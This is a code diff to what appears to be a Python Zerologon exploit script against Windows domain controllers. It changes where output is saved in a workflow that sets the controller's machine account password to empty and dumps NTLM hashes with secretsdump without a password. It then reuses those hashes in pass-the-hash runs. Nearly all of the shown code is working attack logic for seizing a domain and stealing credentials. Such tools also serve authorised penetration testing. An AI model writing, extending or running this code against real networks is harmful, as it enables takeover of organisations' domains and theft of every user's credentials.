@@ -38,6 +38,7 @@ LIGHTPURPLE='\033[1;35m'
 LIGHTCYAN='\033[1;36m'
 WHITE='\033[1;37m'
 
+import os
 import re
 import sys # Used by len, exit, etc
 import logging
@@ -236,19 +237,28 @@ def perform_attack(dc_handle, dc_ip, target_computer):
             print(WHITE+'Target vulnerable, changing account password to empty string'+NOCOLOR)
             result = exploit(dc_handle, rpc_con, target_computer)
             if result['ErrorCode'] == 0:
+
+                mydir = hostname+"_zerologon_dump"
+                if not os.path.exists(mydir):
+                    os.makedirs(mydir)
+                    location = "./"+mydir+"/"+hostname
+                else:
+                    print(RED+mydir+" Already exsists! Seems Zerologon was already ran!"+NOCOLOR)
+                    exit()
+
                 print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                 print(WHITE+"Exploit Successful!"+NOCOLOR)
 
                 print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                 print(WHITE+"Attempting to dump hashes with secretsdump..."+NOCOLOR)
-                secrets_command = "secretsdump.py -just-dc-ntlm -just-dc -no-pass '"+hostname+"$'@"+options.dc_ip+" -outputfile "+hostname
+                secrets_command = "secretsdump.py -just-dc-ntlm -just-dc -no-pass '"+hostname+"$'@"+options.dc_ip+" -outputfile "+location
                 print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                 print(WHITE+"Running commands... "+NOCOLOR)
                 print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                 print(YELLOW+secrets_command+NOCOLOR)
                 subprocess.run(secrets_command, shell=True, stdout=subprocess.DEVNULL)
                 
-                file = open(hostname+".ntds", "r")
+                file = open(location+".ntds", "r")
                 for line in file:
                     if re.search(":::", line):
                         if not re.search("\$",line):
@@ -261,7 +271,8 @@ def perform_attack(dc_handle, dc_ip, target_computer):
                                     domain = ""
                                     username = hashes[0]
                                 nt_hash = hashes[3]
-                                secrets_command = "secretsdump.py '"+username+"'@"+options.dc_ip+" -hashes :"+nt_hash+" -outputfile "+hostname
+                                secrets_command = "secretsdump.py '"+username+"'@"+options.dc_ip+" -hashes :"+nt_hash+" -outputfile "+location
+
                                 print(LIGHTGREEN+"[+] "+NOCOLOR, end = '')
                                 print(YELLOW+secrets_command+NOCOLOR)
                                 subprocess.run(secrets_command, shell=True, stdout=None)
@@ -269,7 +280,7 @@ def perform_attack(dc_handle, dc_ip, target_computer):
                 
                 
                 # restore password
-                file = open(hostname+".secrets", "r")
+                file = open(location+".secrets", "r")
                 for line in file:
                     if re.search("hex", line):
                         hashes = line.split(':')
